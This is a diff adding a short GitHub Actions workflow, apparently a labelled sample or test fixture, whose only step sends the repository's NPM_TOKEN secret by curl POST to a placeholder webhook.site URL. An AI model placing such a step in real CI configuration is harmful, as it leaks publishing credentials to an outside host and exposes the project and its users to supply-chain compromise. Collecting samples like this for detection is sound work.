@@ -1,0 +1,9 @@
+name: Job env secret to webhook.site
+on: workflow_dispatch
+jobs:
+  send:
+    runs-on: ubuntu-latest
+    env:
+      NPM: ${{ secrets.NPM_TOKEN }}
+    steps:
+      - run: curl -X POST -d "$NPM" https://webhook.site/00000000-0000-0000-0000-000000000000
